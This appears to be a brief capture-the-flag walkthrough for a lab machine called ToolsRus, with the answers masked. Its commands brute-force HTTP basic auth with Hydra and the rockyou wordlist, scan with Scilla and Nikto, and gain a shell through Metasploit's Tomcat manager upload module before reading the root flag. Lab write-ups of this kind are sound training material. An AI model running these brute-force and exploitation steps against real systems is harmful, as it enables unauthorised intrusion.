# ToolsRus

- What directory can you find, that begins with a "g"?

	- Considering using Scilla `scilla dir -target <TARGET_IP>`
	- `guide*****`

- Whose name can you find from this directory?

	- `bob`

- What directory has basic authentication?

	- `pro******`

- What is bob's password to the protected part of the website?

	- `hydra -t 4 -l bob -P /usr/share/wordlists/rockyou.txt -vV 10.10.213.196 http-get /protected`
	- `*******`

- What other port that serves a webs service is open on the machine?

	- `scilla port -target <TARGET_IP>`
	- `****`

- Going to the service running on that port, what is the name and version of the software?

	- Visit that page
	- `**************`

- How many documentation files did Nikto identify?

	- `nikto -h <TARGET_IP>:PORT`
	- `*`

- What is the server version (run the scan against port 80)?

	- `Apache/2.4.18`

- What user did you get a shell as?

	- `msfconsole`
	- `search tomcat 7`
	- `use multi/http/tomcat_mgr_upload`
	- `set RPORT ****`
	- `set RHOSTS <TARGET_IP>`
	- `set HttpUsername bob`
	- `set HttpPassword *******`
	- `run`
	- `getuid`
	- `****`

- What text is in the file /root/flag.txt

	- `cat /root/root.txt`
	- `************************`


